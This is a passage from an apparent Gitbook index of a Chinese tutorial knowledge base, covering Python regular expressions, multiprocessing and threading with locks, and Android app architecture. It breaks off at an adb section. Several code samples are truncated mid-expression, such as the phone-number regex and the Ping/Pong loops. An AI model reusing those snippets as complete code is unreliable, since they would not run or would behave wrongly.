验证输入用户名和QQ号是否有效并给出对应的提示信息 要求：用户名必须由字母、数字或下划线构成且长度在6~20个字符之间，QQ号是5~12的数字且首位不能为0 \"\"\" import re def main(): username = input('请输入用户名: ') qq = input('请输入QQ号: ') # match函数的第一个参数是正则表达式字符串或正则表达式对象 # 第二个参数是要跟正则表达式做匹配的字符串对象 m1 = re.match(r'^[0-9a-zA-Z_]{6,20}$', username) if not m1: print('请输入有效的用户名.') m2 = re.match(r'^[1-9]\\d{4,11}$', qq) if not m2: print('请输入有效的QQ号.') if m1 and m2: print('你输入的信息是有效的!') if __name__ == '__main__': main() 提示：上面在书写正则表达式时使用了“原始字符串”的写法（在字符串前面加上了r），所谓“原始字符串”就是字符串中的每个字符都是它原始的意义，说得更直接一点就是字符串中没有所谓的转义字符啦。因为正则表达式中有很多元字符和需要进行转义的地方，如果不使用原始字符串就需要将反斜杠写作\\，例如表示数字的\\d得书写成\\d，这样不仅写起来不方便，阅读的时候也会很吃力。 例子2：从一段文字中提取出国内手机号码。 import re def main(): # 创建正则表达式对象 使用了前瞻和回顾来保证手机号前后不应该出现数字 pattern = re.compile(r'(? 说明：上面匹配国内手机号的正则表达式并不够好，因为像14开头的号码只有145或147，而上面的正则表达式并没有考虑这种情况，要匹配国内手机号，更好的正则表达式的写法是：(?，国内最近好像有19和16开头的手机号了，但是这个暂时不在我们考虑之列。 例子3：替换字符串中的不良内容 import re def main(): sentence = '你丫是傻叉吗? 我操你大爷的. Fuck you.' purified = re.sub('[操肏艹]|fuck|shit|傻[比屄逼叉缺吊屌]|煞笔', '*', sentence, flags=re.IGNORECASE) print(purified) # 你丫是*吗? 我*你大爷的. * you. if __name__ == '__main__': main() 说明：re模块的正则表达式相关函数中都有一个flags参数，它代表了正则表达式的匹配标记，可以通过该标记来指定匹配时是否忽略大小写、是否进行多行匹配、是否显示调试信息等。如果需要为flags参数指定多个值，可以使用按位或运算符进行叠加，如flags=re.I | re.M。 例子4：拆分长字符串 import re def main(): poem = '窗前明月光，疑是地上霜。举头望明月，低头思故乡。' sentence_list = re.split(r'[，。, .]', poem) while '' in sentence_list: sentence_list.remove('') print(sentence_list) # ['窗前明月光', '疑是地上霜', '举头望明月', '低头思故乡'] if __name__ == '__main__': main() 后话 如果要从事爬虫类应用的开发，那么正则表达式一定是一个非常好的助手，因为它可以帮助我们迅速的从网页代码中发现某种我们指定的模式并提取出我们需要的信息，当然对于初学者来收，要编写一个正确的适当的正则表达式可能并不是一件容易的事情（当然有些常用的正则表达式可以直接在网上找找），所以实际开发爬虫应用的时候，有很多人会选择Beautiful Soup或Lxml来进行匹配和信息的提取，前者简单方便但是性能较差，后者既好用性能也好，但是安装稍嫌麻烦，这些内容我们会在后期的爬虫专题中为大家介绍 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-20 22:15:44 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/09-字符串和正则表达式.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/10-进程与线程.html":{"url":"知识库/04.编程开发/02.Python/10-进程与线程.html","title":"10-进程与线程","keywords":"","body":" 概念 Python中的多进程 Python中的多线程 多进程还是多线程 单线程+异步I/O 应用案例 例子1：将耗时间的任务放到线程中以获得更好的用户体验。 进程与线程 今天我们使用的计算机早已进入多CPU或多核时代，而我们使用的操作系统都是支持“多任务”的操作系统，这使得我们可以同时运行多个程序，也可以将一个程序分解为若干个相对独立的子任务，让多个子任务并发的执行，从而缩短程序的执行时间，同时也让用户获得更好的体验。因此在当下不管是用什么编程语言进行开发，实现让程序同时执行多个任务也就是常说的“并发编程”，应该是程序员必备技能之一。为此，我们需要先讨论两个概念，一个叫进程，一个叫线程。 概念 进程就是操作系统中执行的一个程序，操作系统以进程为单位分配存储空间，每个进程都有自己的地址空间、数据栈以及其他用于跟踪进程执行的辅助数据，操作系统管理所有进程的执行，为它们合理的分配资源。进程可以通过fork或spawn的方式来创建新的进程来执行其他的任务，不过新的进程也有自己独立的内存空间，因此必须通过进程间通信机制（IPC，Inter-Process Communication）来实现数据共享，具体的方式包括管道、信号、套接字、共享内存区等。 一个进程还可以拥有多个并发的执行线程，简单的说就是拥有多个可以获得CPU调度的执行单元，这就是所谓的线程。由于线程在同一个进程下，它们可以共享相同的上下文，因此相对于进程而言，线程间的信息共享和通信更加容易。当然在单核CPU系统中，真正的并发是不可能的，因为在某个时刻能够获得CPU的只有唯一的一个线程，多个线程共享了CPU的执行时间。使用多线程实现并发编程为程序带来的好处是不言而喻的，最主要的体现在提升程序的性能和改善用户体验，今天我们使用的软件几乎都用到了多线程技术，这一点可以利用系统自带的进程监控工具 当然多线程也并不是没有坏处，站在其他进程的角度，多线程的程序对其他程序并不友好，因为它占用了更多的CPU执行时间，导致其他程序无法获得足够的CPU执行时间；另一方面，站在开发者的角度，编写和调试多线程的程序都对开发者有较高的要求，对于初学者来说更加困难。 Python既支持多进程又支持多线程，因此使用Python实现并发编程主要有3种方式：多进程、多线程、多进程+多线程 Python中的多进程 Unix和Linux操作系统上提供了fork()系统调用来创建进程，调用fork()函数的是父进程，创建出的是子进程，子进程是父进程的一个拷贝，但是子进程拥有自己的PID。fork()函数非常特殊它会返回两次，父进程中可以通过fork()函数的返回值得到子进程的PID，而子进程中的返回值永远都是0。Python的os模块提供了fork()函数。由于Windows系统没有fork()调用，因此要实现跨平台的多进程编程，可以使用multiprocessing模块的Process类来创建子进程，而且该模块还提供了更高级的封装，例如批量启动进程的进程池（Pool）、用于进程间通信的队列（Queue）和管道（Pipe）等 下面用一个下载文件的例子来说明使用多进程和不使用多进程到底有什么差别，先看看下面的代码 from random import randint from time import sleep, time def downloadTask(name): print('开始下载%s.....' % name) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载完成!耗费%d秒' % (name, time_to_download)) def main(): startTime = time() downloadTask('abc') downloadTask('678') endTime = time() print('总共花费%d秒' % (endTime-startTime)) if __name__ == \"__main__\": main() 下面是运行程序得到的一次运行结果 开始下载abc..... abc下载完成!耗费8秒 开始下载678..... 678下载完成!耗费10秒 总共花费18秒 从上面的例子可以看出，如果程序中的代码只能按顺序一点点的往下执行，那么即使执行两个毫不相关的下载任务，也需要先等待一个文件下载完成后才能开始下一个下载任务，很显然这并不合理也没有效率。接下来我们使用多进程的方式将两个下载任务放到不同的进程中，代码如下所示 from multiprocessing import Process from os import getpid from random import randint from time import sleep, time def downloadTask(name): print('开始下载%s,进程号[%d].....' % (name, getpid())) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载完成!耗费%d秒' % (name, time_to_download)) def main(): startTime = time() p1 = Process(target=downloadTask, args=('abc',)) p1.start() p2 = Process(target=downloadTask, args=('678',)) p2.start() p1.join() p2.join() endTime = time() print('总共花费%d秒' % (endTime-startTime)) if __name__ == \"__main__\": main() 在上面的代码中，我们通过Process类创建了进程对象，通过target参数我们传入一个函数来表示进程启动后要执行的代码，后面的args是一个元组，它代表了传递给函数的参数。Process对象的start方法用来启动进程，而join方法表示等待进程执行结束。运行上面的代码可以明显发现两个下载任务“同时”启动了，而且程序的执行时间将大大缩短，不再是两个任务的时间总和。下面是程序的一次执行结果。 开始下载abc,进程号[9252]..... 开始下载678,进程号[15132]..... 678下载完成!耗费5秒 abc下载完成!耗费9秒 总共花费9秒 我们也可以使用subprocess模块中的类和函数来创建和启动子进程，然后通过管道来和子进程通信，这些内容我们不在此进行讲解，有兴趣的读者可以自己了解这些知识。接下来我们将重点放在如何实现两个进程间的通信。我们启动两个进程，一个输出Ping，一个输出Pong，两个进程输出的Ping和Pong加起来一共10个。听起来很简单吧，但是如果这样写可是错的哦 from multiprocessing import Process from time import sleep counter = 0 def sub_task(string): global counter while counter 看起来没毛病，但是最后的结果是Ping和Pong各输出了10个，Why？当我们在程序中创建进程的时候，子进程复制了父进程及其所有的数据结构，每个子进程有自己独立的内存空间，这也就意味着两个子进程中各有一个counter变量，所以结果也就可想而知了。要解决这个问题比较简单的办法是使用multiprocessing模块中的Queue类，它是可以被多个进程共享的队列，底层是通过管道和信号量（semaphore）机制来实现的，有兴趣的读者可以自己尝试一下。 from multiprocessing import Process, Queue from time import sleep def sub_task(string, q): number = q.get() while number: print('%d: %s' % (number, string)) sleep(0.001) number = q.get() def main(): q = Queue(10) for number in range(1, 11): q.put(number) p1 = Process(target=sub_task, args=('Ping', q)) p1.start() p2 = Process(target=sub_task, args=('Pong', q)) p2.start() if __name__ == '__main__': main() ''' @Description: 创建进程共享 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 20:03:48 ''' import multiprocessing import os def sub_task(queue): print('子进程进程号:', os.getpid()) counter = 0 while counter ''' @Description: 创建进程调用其他程序 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 20:31:58 ''' import subprocess import sys def main(): # 通过sys.argv获取命令行参数 if len(sys.argv) > 1: # 第一个命令行参数是程序本身所以从第二个开始取 for index in range(1, len(sys.argv)): try: # 通过subprocess模块的call函数启动子进程 # status = subprocess.call(index) status = subprocess.call(sys.argv[index]) except Exception as e: print(e) else: print('请使用命令行参数指定要执行的进程') if __name__ == '__main__': main() Python中的多线程 在Python早期的版本中就引入了thread模块（现在名为_thread）来实现多线程编程，然而该模块过于底层，而且很多功能都没有提供，因此目前的多线程开发我们推荐使用threading模块，该模块对多线程编程提供了更好的面向对象的封装。我们把刚才下载文件的例子用多线程的方式来实现一遍 ''' @Description: 线程 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 20:46:06 ''' from random import randint from threading import Thread from time import time, sleep def download(filename): print('开始下载%s...' % filename) time_download = randint(5, 10) sleep(time_download) print('%s下载共花费%d秒' % (filename, time_download)) def main(): startTime = time() t1 = Thread(target=download, args=('Python从入门到住院.pdf',)) t1.start() t2 = Thread(target=download, args=('Peking Hot.avi',)) t2.start() t1.join() t2.join() endTime = time() print('共花费%d秒' % (endTime - startTime)) if __name__ == \"__main__\": main() 我们可以直接使用threading模块的Thread类来创建线程，但是我们之前讲过一个非常重要的概念叫“继承”，我们可以从已有的类创建新类，因此也可以通过继承Thread类的方式来创建自定义的线程类，然后再创建线程对象并启动线程。代码如下所示 ''' @Description: 线程 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 20:51:30 ''' from random import randint from threading import Thread from time import time, sleep class DownloadTask(Thread): def __init__(self, filename): super().__init__() self.filename = filename def run(self): print('%s开始下载' % self.filename) time_to_download = randint(5, 10) sleep(time_to_download) print('%s下载成功！共花费%d秒' % (self.filename, time_to_download)) def main(): startTime = time() t1 = DownloadTask('python从入门到住院.pdf') t1.start() t2 = DownloadTask('Iron Man.avi') t2.start() t1.join() t2.join() endTime = time() print('共花费%d秒' % (endTime - startTime)) if __name__ == \"__main__\": main() 因为多个线程可以共享进程的内存空间，因此要实现多个线程间的通信相对简单，大家能想到的最直接的办法就是设置一个全局变量，多个线程共享这个全局变量即可。但是当多个线程共享同一个变量（我们通常称之为“资源”）的时候，很有可能产生不可控的结果从而导致程序失效甚至崩溃。如果一个资源被多个线程竞争使用，那么我们通常称之为“临界资源”，对“临界资源”的访问需要加上保护，否则资源会处于“混乱”的状态。下面的例子演示了100个线程向同一个银行账户转账（转入1元钱）的场景，在这个例子中，银行账户就是一个临界资源，在没有保护的情况下我们很有可能会得到错误的结果。 ''' @Description: 线程 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 21:20:18 ''' from threading import Thread from time import sleep class Account(): def __init__(self): super().__init__() self._balance = 0 def deposit(self, money): newmoney = self._balance + money sleep(0.01) self._balance = newmoney @property def money(self): return self._balance class AddMoneyThread(Thread): def __init__(self, account, money): super().__init__() self._account = account self._money = money def run(self): self._account.deposit(self._money) def main(): account = Account() threads = [] for _ in range(100): t = AddMoneyThread(account, 1) threads.append(t) t.start() for index in threads: index.join() print('共存储%d元' % account.money) if __name__ == \"__main__\": main() 运行上面的程序，结果让人大跌眼镜，100个线程分别向账户中转入1元钱，结果居然远远小于100元。之所以出现这种情况是因为我们没有对银行账户这个“临界资源”加以保护，多个线程同时向账户中存钱时，会一起执行到new_balance = self._balance + money这行代码，多个线程得到的账户余额都是初始状态下的0，所以都是0上面做了+1的操作，因此得到了错误的结果。在这种情况下，“锁”就可以派上用场了。我们可以通过“锁”来保护“临界资源”，只有获得“锁”的线程才能访问“临界资源”，而其他没有得到“锁”的线程只能被阻塞起来，直到获得“锁”的线程释放了“锁”，其他线程才有机会获得“锁”，进而访问被保护的“临界资源”。下面的代码演示了如何使用“锁”来保护对银行账户的操作，从而获得正确的结果。 ''' @Description: 线程+锁 @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-24 20:53:23 @LastEditors: AaronLuo @LastEditTime: 2020-03-25 22:15:58 ''' from random import randint from threading import Thread, Lock from time import time, sleep class Account(): def __init__(self): super().__init__() self._balance = 0 self._lock = Lock() def deposit(self, money): self._lock.acquire() try: newmoney = self._balance + money sleep(0.01) self._balance = newmoney except Exception as e: print(e) finally: self._lock.release() @property def money(self): return self._balance class AddMoneyThread(Thread): def __init__(self, account, money): super().__init__() self._account = account self._money = money def run(self): self._account.deposit(self._money) def main(): account = Account() threads = [] for _ in range(100): t = AddMoneyThread(account, 1) threads.append(t) t.start() for index in threads: index.join() print('共存储%d元' % account.money) if __name__ == \"__main__\": main() 比较遗憾的一件事情是Python的多线程并不能发挥CPU的多核特性，这一点只要启动几个执行死循环的线程就可以得到证实了。之所以如此，是因为Python的解释器有一个“全局解释器锁”（GIL）的东西，任何线程执行前必须先获得GIL锁，然后每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行，这是一个历史遗留问题，但是即便如此，就如我们之前举的例子，使用多线程在提升执行效率和改善用户体验方面仍然是有积极意义的 多进程还是多线程 无论是多进程还是多线程，只要数量一多，效率肯定上不去，为什么呢？我们打个比方，假设你不幸正在准备中考，每天晚上需要做语文、数学、英语、物理、化学这5科的作业，每项作业耗时1小时。如果你先花1小时做语文作业，做完了，再花1小时做数学作业，这样，依次全部做完，一共花5小时，这种方式称为单任务模型。如果你打算切换到多任务模型，可以先做1分钟语文，再切换到数学作业，做1分钟，再切换到英语，以此类推，只要切换速度足够快，这种方式就和单核CPU执行多任务是一样的了，以旁观者的角度来看，你就正在同时写5科作业。 但是，切换作业是有代价的，比如从语文切到数学，要先收拾桌子上的语文书本、钢笔（这叫保存现场），然后，打开数学课本、找出圆规直尺（这叫准备新环境），才能开始做数学作业。操作系统在切换进程或者线程时也是一样的，它需要先保存当前执行的现场环境（CPU寄存器状态、内存页等），然后，把新任务的执行环境准备好（恢复上次的寄存器状态，切换内存页等），才能开始执行。这个切换过程虽然很快，但是也需要耗费时间。如果有几千个任务同时进行，操作系统可能就主要忙着切换任务，根本没有多少时间去执行任务了，这种情况最常见的就是硬盘狂响，点窗口无反应，系统处于假死状态。所以，多任务一旦多到一个限度，反而会使得系统性能急剧下降，最终导致所有任务都做不好。 是否采用多任务的第二个考虑是任务的类型，可以把任务分为计算密集型和I/O密集型。计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如对视频进行编码解码或者格式转换等等，这种任务全靠CPU的运算能力，虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低。计算密集型任务由于主要消耗CPU资源，这类任务用Python这样的脚本语言去执行效率通常很低，最能胜任这类任务的是C语言，我们之前提到了Python中有嵌入C/C++代码的机制。 除了计算密集型任务，其他的涉及到网络、存储介质I/O的任务都可以视为I/O密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待I/O操作完成（因为I/O的速度远远低于CPU和内存的速度）。对于I/O密集型任务，如果启动多任务，就可以减少I/O等待时间从而让CPU高效率的运转。有一大类的任务都属于I/O密集型任务，这其中包括了我们很快会涉及到的网络应用和Web应用。 单线程+异步I/O 现代操作系统对I/O操作的改进中最为重要的就是支持异步I/O。如果充分利用操作系统提供的异步I/O支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型。Nginx就是支持异步I/O的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。用Node.js开发的服务器端程序也使用了这种工作模式，这也是当下实现多任务编程的一种趋势。 在Python语言中，单线程+异步I/O的编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。协程最大的优势就是极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销。协程的第二个优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不用加锁，只需要判断状态就好了，所以执行效率比多线程高很多。如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。关于这方面的内容，我稍后会做一个专题来进行讲解。 应用案例 例子1：将耗时间的任务放到线程中以获得更好的用户体验。 如下所示的界面中，有“下载”和“关于”两个按钮，用休眠的方式模拟点击“下载”按钮会联网下载文件需要耗费10秒的时间，如果不使用“多线程”，我们会发现，当点击“下载”按钮后整个程序的其他部分都被这个耗时间的任务阻塞而无法执行了，这显然是非常糟糕的用户体验，代码如下所示。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-25 22:21:32 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/10-进程与线程.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/00.Android扫盲.html":{"url":"知识库/05.移动安全/00.Android扫盲.html","title":"00.Android扫盲","keywords":"","body":" 介绍 Android 开发优势 Android 应用程序 架构 Linux 内核 程序库 Android程序库 Android运行时 应用框架 应用程序 Android 应用程序组件 Activities Services Broadcast Receivers Content Providers 附加组件 Android 项目目录结构 主要活动文件（MainActivity.java） Manifest文件 Strings 文件 R 文件 Layout 文件 Android 资源（Resources）访问 组织资源 adb 导出一个app 介绍 Android 是一个开源的，基于 Linux 的移动设备操作系统，如智能手机和平板电脑。Android 是由谷歌及其他公司带领的开放手机联盟开发的。 Android 提供了一个统一的应用程序开发方法，这意味着开发人员只需要为 Android 进行开发，这样他们的应用程序就能够运行在不同搭载 Android 的移动设备上。 谷歌在2007年发布了第一个测试版本的 Android 软件开发工具包（SDK），第一个商业版本的 Android 1.0，则发布于2008年9月。 2012年6月27日，在谷歌I/O大会上，谷歌宣布发布了 Android 版本4.1 Jelly Bean。 Jelly Bean 是一个在功能和性能方面的渐进的更新，主要目的是改进用户界面， Android 源代码是根据自由和开放源码软件许可证。谷歌发布的大部分代码遵循 Apache 许可证2.0版，Linux 内核的变化遵循 GNU 通用公共许可证版本2。 Android 开发优势 开放源代码 众多开发者及强大的社区 不断增长的市场 国际化的 App 集成 低廉的开发成本 更高的成功几率 丰富的开发环境 Android 应用程序 Android 应用程序一般使用 Android 软件开发工具包，采用 Java 语言来开发。 一旦开发完成，Android 应用程序可以容易的打包，并在诸如 Google Play 和亚马逊应用商店上出售。 架构 Android 操作系统是一个软件组件的栈，在架构图中它大致可以分为五个部分和四个主要层。 Linux 内核 在所有层的最底下是 Linux - 包括大约115个补丁的 Linux 3.6。它提供了基本的系统功能，比如进程管理，内存管理，设备管理（如摄像头，键盘，显示器）。同时，内核处理所有 Linux 所擅长的工作，如网络和大量的设备驱动，从而避免兼容大量外围硬件接口带来的不便。 程序库 在 Linux 内核层的上面是一系列程序库的集合，包括开源的 Web 浏览器引擎 Webkit ，知名的 libc 库，用于仓库存储和应用数据共享的 SQLite 数据库，用于播放、录制音视频的库，用于网络安全的 SSL 库等。 Android程序库 这个类别包括了专门为 Android 开发的基于 Java 的程序库。这个类别程序库的示例包括应用程序框架库，如用户界面构建，图形绘制和数据库访问。一些 Android 开发者可用的 Android 核心程序库总结如下： android.app - 提供应用程序模型的访问，是所有 Android 应用程序的基石。 android.content - 方便应用程序之间，应用程序组件之间的内容访问，发布，消息传递。 android.database - 用于访问内容提供者发布的数据，包含 SQLite 数据库管理类。 android.opengl - OpenGL ES 3D 图片渲染 API 的 Java 接口。 android.os - 提供应用程序访问标注操作系统服务的能力，包括消息，系统服务和进程间通信。 android.text - 在设备显示上渲染和操作文本。 android.view - 应用程序用户界面的基础构建块。 android.widget - 丰富的预置用户界面组件集合，包括按钮，标签，列表，布局管理，单选按钮等。 android.webkit - 一系列类的集合，允许为应用程序提供内建的 Web 浏览能力。 Android运行时 这是架构中的第三部分，自下而上的第二层。这个部分提供名为 Dalvik 虚拟机的关键组件，类似于 Java 虚拟机，但专门为 Android 设计和优化。 Dalvik 虚拟机使得可以在 Java 中使用 Linux 核心功能，如内存管理和多线程。Dalvik 虚拟机使得每一个 Android 应用程序运行在自己独立的虚拟机进程。 Android 运行时同时提供一系列核心的库来为 Android 应用程序开发者使用标准的 Java 语言来编写 Android 应用程序。 应用框架 应用框架层以 Java 类的形式为应用程序提供许多高级的服务。应用程序开发者被允许在应用中使用这些服务。 活动管理者 - 控制应用程序生命周期和活动栈的所有方面。 内容提供者 - 允许应用程序之间发布和分享数据。 资源管理器 - 提供对非代码嵌入资源的访问，如字符串，颜色设置和用户界面布局。 通知管理器 - 允许应用程序显示对话框或者通知给用户。 视图系统 - 一个可扩展的视图集合，用于创建应用程序用户界面。应用程序 顶层中有所有的 Android 应用程序。你写的应用程序也将被安装在这层。这些应用程序包括通讯录，浏览器，游戏等。Android 应用程序组件 应用程序组件是一个Android应用程序的基本构建块。这些组件由应用清单文件松耦合的组织。AndroidManifest.xml描述了应用程序的每个组件，以及他们如何交互。 以下是可以在Android应用程序中使用的四个主要组件。 组件 描述 Activities 描述UI，并且处理用户与机器屏幕的交互。 Services 处理与应用程序关联的后台操作。 Broadcast Receivers 处理Android操作系统和应用程序之间的通信。 Content Providers 处理数据和数据库管理方面的问题。 Activities 一个活动标识一个具有用户界面的单一屏幕。举个例子，一个邮件应用程序可以包含一个活动用于显示新邮件列表，另一个活动用来编写邮件，再一个活动来阅读邮件。当应用程序拥有多于一个活动，其中的一个会被标记为当应用程序启动的时候显示。 一个活动是Activity类的一个子类，如下所示： public class MainActivity extends Activity { } Services 服务是运行在后台，执行长时间操作的组件。举个例子，服务可以是用户在使用不同的程序时在后台播放音乐，或者在活动中通过网络获取数据但不阻塞用户交互。 一个服务是Service类的子类，如下所示： public class MyServices extends Services{ } Broadcast Receivers 广播接收器简单地响应从其他应用程序或者系统发来的广播消息。举个例子，应用程序可以发起广播来让其他应用程序知道一些数据已经被下载到设备，并且可以供他们使用。因此广播接收器会拦截这些通信并采取适当的行动。 广播接收器是BroadcastReceiver类的一个子类，每个消息以Intent对象的形式来广播。 public class MyReceiver extends BroadcastReceiver { } Content Providers 内容提供者组件通过请求从一个应用程序到另一个应用程序提供数据。这些请求由ContentResolver类的方法来处理。这些数据可以是存储在文件系统、数据库或者其他其他地方。 内容提供者是ContentProvider类的子类，并实现一套标准的API，以便其他应用程序来执行事务。 public class MyContentProvider extends ContentProvider { } 附加组件 有一些附件的组件用于以上提到的实体、他们之间逻辑、及他们之间连线的构造。这些组件如下： 组件 描述 Fragments 代表活动中的一个行为或者一部分用户界面。 Views 绘制在屏幕上的UI元素，包括按钮，列表等。 Layouts 控制屏幕格式，展示视图外观的View的继承。 Intents 组件间的消息连线。 组件间的消息连线。 Resources 外部元素，例如字符串资源、常量资源及图片资源等。 Manifest 应用程序的配置文件。 Android 项目目录结构 序号 文件夹、文件和说明 1 src:包含项目中所有的.java源文件，默认情况下，它包括一个 MainActivity.java源文件对应的活动类，当应用程序通过应用图标启动时，将运行它。 2 gen:这包含由编译器生成的.R文件，引用了所有项目中的资源。该文件不能被修改。 3 bin:这个文件夹包含Android由APT构建的.apk包文件，以及运行Android应用程序所需要的其他所有东西。 4 res/drawable-hdpi:这个目录下包括所有的为高密度屏幕设计所需的drawable对象。 5 res/layout:这个目录存放用于定义用户界面的文件。 6 res/values:这个目录存放各种各样的包含一系列资源的XML文件，比如字符串和颜色的定义。 7 AndroidManifest.xml:这个是应用程序的清单文件，描述了应用程序的基础特性，定义它的各种组件。 主要活动文件（MainActivity.java） 主要活动代码在MainActivity.java文件，这是实际的应用程序文件，将被转化为Dalvik可执行文件并运行。 package com.example.helloworld; import android.os.Bundle; import android.app.Activity; import android.view.Menu; import android.view.MenuItem; import android.support.v4.app.NavUtils; public class MainActivity extends Activity { @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); } @Override public boolean onCreateOptionsMenu(Menu menu) { getMenuInflater().inflate(R.menu.activity_main, menu); return true; } } 这里，R.layout.activity_main引用自res/layout目录下的activity_main.xml文件。onCreate()是活动被加载之后众多被调用的方法之一。 Manifest文件 无论开发什么组件用作应用程序中的一部分，都需要在应用程序项目根目录下的manifest.xml文件中声明所有的组件。这个文件是Android操作系统与你的应用程序之间的接口，因此，如果没有在这个文件中声明你的组件，将无法被操作系统所识别。举个例子，一个默认的清单文件看起来如下： 这里，...标签之间是应用程序相关的组件。andnroid:icon属性指出位于res/drawable-hdpi下面的应用程序图标。这个应用使用drawable文件夹下名为ic_launcher.png的图片。 标签用于指定一个活动，android:name属性指定一个Activity类子类的全名。android:label属性指定用于活动名称的字符串。可以使用标签来指定多个活动 意图过滤器的action被命名为android.intent.action.MAIN，表明这个活动被用做应用程序的入口。意图过滤器的category被命名为android.intent.category.LAUNCHER，表明应用程序可以通过设备启动器的图标来启动。 @string指的是strings.xml(将在后面介绍)。因此，@string/app_name指的是定义在strings.xml中的app_name，实际为\"Hello World\"。类似的，应用中的其他字符串也很流行。 下面是你的清单文件中将用到的标签，用于指定不同的Android应用程序组件： 活动元素 服务元素 广播接收器元素 内容提供者元素Strings 文件 strings.xml文件在res/value文件夹下，它包含应用程序使用到的所有文本。例如，按钮、标签的名称，默认文本，以及其他相似的strings。这个文件为他们的文本内容负责。一个默认的strings文件看起来如下： HelloWorld Hello world! Settings MainActivity R 文件 gen/com.example.helloworld/R.java文件是活动的Java文件，如MainActivity.java的和资源如strings.xml之间的胶水。这是一个自动生成的文件，不要修改R.java文件的内容。下面是一个R.java文件的示例： ```java / AUTO-GENERATED FILE. DO NOT MODIFY. This class was automatically generated by the aapt tool from the resource data it found. It should not be modified by hand. */ package com.example.helloworld; public final class R { public static final class attr { } public static final class dimen { public static final int padding_large=0x7f040002; public static final int padding_medium=0x7f040001; public static final int padding_small=0x7f040000; } public static final class drawable { public static final int ic_action_search=0x7f020000; public static final int ic_launcher=0x7f020001; } public static final class id { public static final int menu_settings=0x7f080000; } public static final class layout { public static final int activity_main=0x7f030000; } public static final class menu { public static final int activity_main=0x7f070000; } public static final class string { public static final int app_name=0x7f050000; public static final int hello_world=0x7f050001; public static final int menu_settings=0x7f050002; public static final int title_activity_main=0x7f050003; } public static final class style { public static final int AppTheme=0x7f060000; } } ### Layout 文件 activity_main.xml是一个在res/layout目录下的layout文件。当应用程序构建它的界面时被引用。你将非常频繁的修改这个文件来改变应用程序的布局。在\"Hello World\"应用程序中，这个文件具有默认的布局，内容如下： ```java TextView是一个Android的控件用于构建用户图形界面。它包含有许多不同的属性，诸如android:layout_width, android:layout_height等用来设置它的宽度和高度等。@string指的是res/values文件夹下的strings.xml文件。因此，@string/hello_world指的是定义在strings.xml中的名为hello的字符串：\"Hello World!\"。 Android 资源（Resources）访问 有许多东西用来构建一个优秀的 Android 应用程序。除了应用程序的编码，你需要关注各种各样的资源，诸如你用到的各种静态内容，如位图，颜色，布局定义，用户界面字符串，动画等等。这些资源一般放置在项目的 res/ 下独立子目录中。 这节教程将学习如何来组织应用程序资源，指定替代资源，并在应用程序中访问它们。 组织资源 开发之前需要将每种资源放置在项目中 res/ 目录的特定子目录下。例如，这是一个简单项目的文件层级 MyProject/ src/ MyActivity.java res/ drawable/ icon.png layout/ activity_main.xml info.xml values/ strings.xml res/ 目录在各种子目录中包含了所有的资源。这里有一个图片资源，两个布局资源和一个字符串资源文件。下表详细的给出了在项目中 res/ 目录里面支持的资源。 目录 资源类型 anim/ 定义动画属性的XML文件。它们被保存在res/anim/文件夹下，通过R.anim类访问 color/ 定义颜色状态列表的XML文件。它们被保存在res/color/文件夹下，通过R.color类访问 drawable/ 图片文件，如.png,.jpg,.gif或者XML文件，被编译为位图、状态列表、形状、动画图片。它们被保存在res/drawable/文件夹下，通过R.drawable类访问 layout/ 定义用户界面布局的XML文件。它们被保存在res/layout/文件夹下，通过R.layout类访问 menu/ 定义应用程序菜单的XML文件，如选项菜单，上下文菜单，子菜单等。它们被保存在res/menu/文件夹下，通过R.menu类访问 raw/ 任意的文件以它们的原始形式保存。需要根据名为R.raw.filename的资源ID，通过调用Resource.openRawResource()来打开raw文件 values/ 包含简单值(如字符串，整数，颜色等)的XML文件。这里有一些文件夹下的资源命名规范。arrays.xml代表数组资源，通过R.array类访问；integers.xml代表整数资源，通过R.integer类访问；bools.xml代表布尔值资源，通过R.bool类访问；colors.xml代表颜色资源，通过R.color类访问；dimens.xml代表维度值，通过R.dimen类访问；strings.xml代表字符串资源，通过R.string类访问；styles.xml代表样式资源，通过R.style类访问 xml/ 可以通过调用Resources.getXML()来在运行时读取任意的XML文件。可以在这里保存运行时使用的各种配置文件 adb 导出一个app 0x1 找到对应的app ╭─[aaronluo@localhost]-[~] ╰─➤ adb shell am monitor Monitoring activity manager... available commands: (q)uit: finish monitoring ** Activity starting: 